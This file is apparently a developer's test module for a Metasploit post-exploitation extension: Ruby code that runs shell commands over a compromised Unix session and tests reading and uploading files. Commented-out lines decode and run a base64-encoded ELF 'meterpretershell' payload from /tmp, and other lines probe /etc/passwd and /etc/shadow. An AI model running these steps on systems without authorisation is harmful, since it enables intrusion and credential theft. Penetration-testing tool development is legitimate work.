##
# Advanced Post Exploitation
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  # include Msf::Post::Staekka::File

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Testing',
                      'Description'   => 'testing....',
                      'Author'        => ['jot'],
                      'SessionTypes'  => ['shell']))
  end

  def run_bug
    #    print_status session.set_shell_token_index
    #    session.set_shell_token_index(1, true)
    #    print_status session.set_shell_token_index
    print_status("$ uname -a\n|#{cmd_exec('uname -a')}|")
    print_status("$ sleep 0.1 (empty)\n" + cmd_exec('sleep 0.1'))
    print_status("$ pwd\n" + cmd_exec('pwd'))
  end

  def run_mini
    print_status("$ uname -a\n|#{cmd_exec('uname -a')}|")
    print_status("$ echo X * 200\n" + cmd_exec("echo #{'X' * 200}"))
    print_status("$ pwd\n" + cmd_exec('pwd'))
    print_status("$ id\n" + cmd_exec('id'))
    # cmd_multi = "echo -n AAAA; echo BBBB; echo CCCC; echo DDDD; echo EEEEE& sleep 1; echo FFFF"
    cmd_multi = "for m in `df -P | awk -F ' ' '{print $NF}' | sed -e \"1d\"`;do n=`df -P | grep \"$m$\" | awk -F ' ' '{print $5}' | cut -d% -f1`;i=0;if [[ $n =~ ^-?[0-9]+$ ]];then printf '%-25s' $m;while [ $i -lt $n ];do echo -n '=';let \"i=$i+1\";done;echo \" $n\";fi;done"
    print_status("$ #{cmd_multi}\n" + cmd_exec(cmd_multi))
    # print_status("$ meterpretershell...\n" + cmd_exec("echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1tofwAAAWgCABFRieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=>>/tmp/xx3.b64; ((which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > /tmp/xx3.bin < /tmp/xx3.b64; chmod +x /tmp/xx3.bin; /tmp/xx3.bin &; echo AAAAA; echo BBBBBBBBBB; echo CCCC"))
    # print_status("$ meterpretershell...\n" + cmd_exec("echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1tofwAAAWgCABFRieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=>>/tmp/xx3.b64; ((which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > /tmp/xx3.bin  < /tmp/xx3.b64 ; echo AAAAA; echo BBBBBBBBBB; echo CCCC"))
    # print_status("$ meterpretershell...\n" + cmd_exec("((which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > /tmp/xx3.bin  < /tmp/xx3.b64 ; echo AAAAA; echo BBBBBBBBBB; echo CCCC"))
    # cmd_exec("/bin/ls -a")
    # cmd_exec("./bin/ls")
    # cmd_exec("./bin/ls -l")
    # cmd_exec("ls")
    # cmd_exec("ls -la")
  end

  def run_off
    print_status("$ uname -a\n" + cmd_exec('uname -a'))
    cmd_exec('/bin/ls')
    cmd_exec('/bin/ls -a')
    cmd_exec('./bin/ls')
    cmd_exec('./bin/ls -l')
    cmd_exec('ls')
    cmd_exec('ls -la')
    print_status("cat /etc/issue:\n#{read_file('/etc/issue')}")
    print_status("/etc/passwd: exists? #{exists?('/etc/passwd')}")
    print_status("/no/such file: exists? #{exists?('/no/such/file')}")
    print_status("/etc/passwd: readable? #{readable?('/etc/passwd')}")
    print_status("/etc/shadow: readable? #{readable?('/etc/shadow')}")
    #    print_status("/etc/passwd: directory? #{directory?("/etc/passwd")}")
    #    print_status("/etc: directory? #{directory?("/etc")}")
    #    print_status("/etc/passwd: writeable? #{writeable?("/etc/passwd")}")
    #    print_status("/tmp writeable? #{writeable?("/tmp")}")
    #    print_status("/etc/passwd: suid? #{suid?("/etc/passwd")}")
    #    print_status("/bin/passwd: suid? #{suid?("/bin/passwd")}")
    #    print_status("A")
    #    print_status("B")
    #    print_status("C")
  end

  def run
    # run_bug
    run_mini
    run_off
  end

  def run_full
    # session.rstream.
    # session.set_shell_token_index(1)
    #        print_status("$ id \n" + cmd_exec("id"))
    #		print_status("SESSION: pwd->" + session.shell_command_token("pwd"))
    #        print_status("$ pwd")
    #        print_status( "#{cmd_exec("pwd")}")
    #        print_status("$ echo XXXX\n" + cmd_exec("echo XXXX"))
    #        long_x = ""
    #        5000.times { long_x << "X" }
    #        print_status("$ echo XXX*\n" + cmd_exec("echo #{long_x}"))
    #        print_status("$ echo XXXX\n" + cmd_exec("echo XXXX"))
    print_status("$ echo XXXX\n|#{cmd_exec('echo XXXX').dump}|")
    #        print_status("SLEEP: #{session.shell_command_token_unix("sleep 5; echo OOOO", 2)}")
    #        print_status("SHELL: " + cmd_exec("echo $SHELL"))
    #        print_status("SHELL: " + cmd_exec("echo $0"))
    # out = cmd_exec("ruby /tmp/speed_test.rb")
    # tmp = out.lines.to_a.last
    #        print_status("SPEED Test: #{tmp}" )
    ###############################################
    #        rootdir = '/'
    #        session.locate_updatedb(rootdir)
    #        updatedb_file = "test/data/files/updatedb-2"
    #        session.locate_updatedb(rootdir, updatedb_file)
    #        print_status "Updatedb: /etc/passwd #{session.updatedb_file_exists?("/etc/passwd")}"
    #        meta = session.updatedb_file_ls("/etc/shadow")
    #        print_status "META=|#{meta}|"
    ###############################################
    print_status("$ uname -a\n" + cmd_exec('uname -a'))
    # print_status("$ PS1 " + cmd_exec('export PS1=\'$ \''))
    # tty_settings = "2506:5:bf:8a3b:3:1c:7f:15:4:0:1:0:11:13:1a:0:12:f:17:16:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0"
    # session.shell_write('stty #{tty_settings}')
    # session.shell_write('stty rows 2000')
    # print_status("$ stty " + cmd_exec('stty #{tty_settings}'))
    #        print_status("$ MAX LINE: #{_unix_max_line_length()}")
    #        		print_status("$ Success? [yes]: #{cmd_success?("echo A")}")
    #        		print_status("$ Success? [no]: #{cmd_success?("cat /x/y/z")}")
    #        		print_status("$ Success? [no]: #{cmd_success?("cat /non/existing/file")}")
    #        		print_status("$ uname -a \n" + cmd_exec("uname -a"))
    #		tmp_string = ""
    #		500.times do
    #				tmp_string << "A"
    #		end
    #		tmp_string << "XXX"
    #		print_status("$ echo AAAAA.... \n" + cmd_exec("echo #{tmp_string}"))
    #
    ###
    @workdir = 'test/data/files'
    # print_status read_file("#{@workdir}/file_oneline", true, false)
    # print_status read_file_plaintext("#{@workdir}/file_oneline")
    # print_status "Download: #{download("#{@workdir}/file_multiline", true, true, 5).match("Mulit lin3s")}"
    #		out = read_file("#{@workdir}/file_oneline")
    #		if out.match("one LinE")
    #				print_status("read_file() [SUCCESSS]")
    #		else
    #				print_status("read_file() [FAIL]")
    #				print_status("#{@workdir}/file_oneline|CONTENT:#{out}")
    #		end
    #        		write_file("#{@workdir}/tmp_file_1", "write\ninto\nfile\ntest__1\nTest__")
    #        		out = read_file("#{@workdir}/tmp_file_1", true, false)
    #        	  if out.match("test__1")
    #        				print_status("write_file() [SUCCESSS]")
    #        		else
    #        				print_status("write_file() [FAIL]")
    #        		end
    # print_status("$ head -n 10 /etc/passwd \n" + cmd_exec("head -n 10 /etc/passwd"))
    # print_status("$ [EMPTY] \n" + cmd_exec("echo XXXXXXXXXXXX"))
    # print_status("$ cat /etc/passwd \n" + cmd_exec("cat /etc/passwd"))
    # print_status("$ cat /etc/fstab \n" + cmd_exec("cat /etc/fstab"))
    # print_status("$ w\n" + cmd_exec("w"))
    #        		@workdir = 'test/data/files'
    #        		@localdir = 'test/data/files'
    # file_delete_from_cache("#{@workdir}/file_multiline")
    # out = read_file_plaintext("#{@workdir}/file_ascii_4")
    # out = read_file_plaintext("#{@workdir}/file_ascii_4")
    #        out = read_file_binary("#{@workdir}/file_ascii_4")
    # out = cmd_exec("cat #{@workdir}/file_ascii_4")
    # print_status("out=|#{out.dump}|")
    #        tmpfile = "/tmp/__test_localfile_1"
    #        tmp = ::File.new(tmpfile, "w")
    #        tmp.print out
    #        tmp.close
    # out = file_local_digestmd5("#{@localdir}/file_binary") == file_remote_digestmd5("#{@workdir}/file_binary")

    vprint_status('debug')
    print_status("$ echo XXXX\n|#{cmd_exec('echo XXXX').dump}|")
    print_status("$ echo A * 80\n|#{cmd_exec("echo #{'A' * 200}").dump}|")
    print_status "Can read /etc/passwd? #{readable?('/etc/passwd')}"
    #######################################
    #        foo = %q^cat __READ_FILE__ |openssl          enc -a -e^
    #        #foo = %q^php  -r 'print base64_encode(file_get_contents("__READ_FILE__"));'^
    #        session.cache.delete("base64_command")
    #        session.cache.add("base64_command", foo)
    #        out  = read_file_binary("/etc/issue")
    #        print_status "FILE:|#{out}|"
    #######################################
    # out = download("#{@workdir}/file_multiline", false)
    # write_file("#{@workdir}/tmp_file_2", ::File.read("#{@workdir}/file_binary"))
    # out = file_remote_digestmd5("#{@workdir}/file_binary") == file_remote_digestmd5("#{@workdir}/tmp_file_2")
    # print_status("out=|#{out}|")
    #		out = read_file("#{@workdir}/file_multiline", true, false, 5)
    #		print_status("out=|#{out}|")
    #        		delete_from_cache("#{@workdir}/file_multiline")
    #        		download("#{@workdir}/file_multiline2", true, true, 5)
    #        		out = file_from_cache("#{@workdir}/file_multiline2")
    #        		print_status("out=|#{out}|")
    #        find_download_tool()
    #			fast_upload(nil,nil)
    #			cmd_exec("tar cvf /tmp/tar-1 /usr/local/ports/x11", nil, 600)
    #			cmd_exec("cat /tmp/base1 |openssl          enc -a -e >/tmp/tar-2")
    #			tmp = cmd_exec("cat /tmp/base1", nil, 600)
    #			t = ::File.new("/tmp/base2", "w")
    #			t.print tmp
    #			t.close
    #			t2 = ::File.new("/tmp/base3", "w")
    #			t2.print tmp.dump
    #			t2.close
    print_status '.................ok'
  end

  def fast_upload(_local_file, _remote_file)
    m = framework.post.create('unix/general/upload')
    m.datastore['SESSION'] = datastore['SESSION']
    m.datastore['SRVHOST'] = '127.0.0.1'
    m.datastore['LFILE'] = '/etc/passwd'
    m.datastore['RFILE'] = '/tmp/upload-2'
    # m.datastore[''] =
    # m.datastore[''] =
    m.options.validate(m.datastore)
    m.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output
    )
  end
end
